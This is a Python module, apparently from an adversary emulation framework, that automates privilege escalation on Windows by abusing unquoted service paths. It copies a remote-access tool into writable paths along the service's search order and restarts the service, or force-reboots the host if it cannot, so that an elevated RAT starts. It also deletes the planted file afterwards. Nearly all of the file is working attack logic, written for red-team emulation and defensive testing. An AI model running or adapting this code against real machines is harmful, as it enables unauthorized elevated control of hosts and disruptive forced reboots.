import logging
import asyncio

from plugins.adversary.app.commands import cmd, sc
from plugins.adversary.app.operation.operation import Step, OPFile, OPHost, OPRat, OPVar, OPService
from plugins.adversary.app.commands.errors import *

log = logging.getLogger(__name__)


class ServiceManipulateUnquotedLocal(Step):
    """
    Description:
        This step hijacks the search order of an unquoted service path in order to spawn an elevated rat.
    Requirements:
        Requires a non-elevated RAT, and enumeration of unquoted service paths on the target machine (possible
        result of running GetPrivEscSvcInfo).
    """
    attack_mapping = [('T1034', 'Privilege Escalation'), ('T1034', 'Persistence'), ('T1035', 'Execution'),
                      ('T1106', 'Execution')]
    display_name = "service_manipulation(unquoted path)"
    summary = "Abuse unquoted service paths to hijack search order and spawn an elevated rat"

    preconditions = [("host", OPHost),
                     ("rat", OPRat({"elevated": False,
                                    "host": OPVar("host")})),
                     ("service", OPService({'vulnerability': 'unquoted',
                                            'host': OPVar("host"),
                                            'revert_command': "",
                                            'can_restart': True,
                                            'user_context': OPVar("rat.username")}))]
    postconditions = [("rat_g", OPRat({"host": OPVar("host"), "elevated": True})),
                      ("file_g", OPFile({"host": OPVar("host"),
                                         "src_host": OPVar("host"),
                                         "src_path": OPVar("rat.executable"),
                                         'use_case': "rat"})),
                      ("service_g", OPService)]

    @staticmethod
    def description(rat, service, host):
        return "Attempting to abuse {}'s unquoted path on {}".format(service.name, host.hostname)

    @staticmethod
    async def simulate(operation, rat, service, host, rat_g, service_g, file_g):
        return True

    @staticmethod
    async def action(operation, rat, service, host, rat_g, service_g, file_g):
        for path in service.modifiable_paths:
            try:
                await operation.execute_shell_command(rat, *cmd.copy(rat.executable, path))
            except (AccessDeniedError, FileInUseError):
                # for some reason we couldn't actually write to "path", move on to the next one
                # or this specific file we're trying to create already exists, so try a different one
                continue
            await file_g({'path': path})
            # if we get here, the copy worked, so now we need to restart the service
            if service.can_restart:
                try:
                    await operation.execute_shell_command(rat, *sc.stop(service.name))
                    await asyncio.sleep(2)  # make sure the service has time to properly stop
                    await operation.execute_shell_command(rat, *sc.start(service.name))
                except ServiceNotStartedError:
                    pass  # this is fine in our case if it isn't already running
                except (AccessDeniedError, ServiceAlreadyRunningError, UnresponsiveServiceError):
                    await service_g({'name': service.name,  # update our service with what we modified
                                     'host': service.host,  # these first three uniquely id this service
                                     'vulnerability': service.vulnerability,
                                     'revert_command': "echo \"Not Vulnerable\""})
                    return False
            else:
                await operation.execute_shell_command(rat, *cmd.shutdown(reboot=True, delay=0, force=True))
                # todo add api to wait for reboot
                await asyncio.sleep(120)  # wait 2 minutes for box to reboot
            await rat_g()
            return True
        # We've gone though all the possible paths and none have worked, mark this as a failure
        await service_g({'name': service.name,  # update our service with what we modified
                         'host': service.host,  # these first three uniquely id this service
                         'vulnerability': service.vulnerability,
                         'revert_command': "echo \"Not Vulnerable\""})
        return False

    @staticmethod
    async def cleanup(cleaner, host, service, file_g):
        # stop the service so we can delete the files
        try:
            await cleaner.run_on_agent(host, *sc.stop(service['name']))
        except ServiceNotStartedError:
            pass
        except CantControlServiceError:
            log.debug("Can't stop {} on {}, so can't delete {}".format(service.name,
                                                                       service.host,
                                                                       file_g[0].path))
        for file in file_g:
            if file['use_case'] == 'rat':
                await cleaner.delete(file)
